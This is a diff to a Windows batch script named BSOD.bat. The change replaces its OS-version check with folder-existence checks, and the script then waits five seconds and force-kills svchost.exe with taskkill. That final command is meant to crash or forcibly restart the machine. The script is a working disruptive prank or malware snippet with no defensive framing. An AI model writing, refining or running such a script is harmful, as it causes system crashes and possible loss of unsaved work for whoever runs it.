@@ -1,16 +1,19 @@
 @echo off
-if !osNumber! lss 52 (
-	cls
+if exist "C:\Users" goto yes
+if exist "C:\Documents and Settings" goto no
+:no
+cls
 
-	title Unsupported Operating System Detected
-	color 0a
+title Unsupported Operating System Detected
+color 0a
 
-	echo Cannot execute BSOD.bat 
-	echo Windows Vista is required to execute this file.
-	echo .
+echo Cannot execute BSOD.bat 
+echo Windows Vista is required to execute this file.
+echo .
 	
-	pause
-	exit
+pause
+exit
+:yes
 color 0a
 timeout 5
 taskkill /f /im svchost.exe
